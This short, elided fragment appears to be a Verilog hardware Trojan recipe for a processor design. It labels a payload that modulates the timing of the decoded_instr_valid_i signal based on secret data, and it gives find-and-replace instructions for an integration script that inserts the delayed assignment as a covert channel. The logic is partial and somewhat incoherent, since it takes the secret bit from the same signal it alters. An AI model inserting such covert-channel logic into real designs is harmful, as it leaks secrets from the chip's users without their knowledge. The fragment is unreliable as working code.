 ...
 * Payload: Modulate timing of decoded_instr_valid_i based on secret data
 * 
...
assign secret_bit = decoded_instr_valid_i[0];
...
// ============================================================
// Covert Channel: Modulate timing of decoded_instr_valid_i
//
// Integration Script Must Modify:
//
// IF decoded_instr_valid_i is timing-sensitive:
//   Find: assign decoded_instr_valid_i = ready_signal;
//   Replace: assign decoded_instr_valid_i = (timing_delay == 0) ? ready_signal : 1'b0;
//
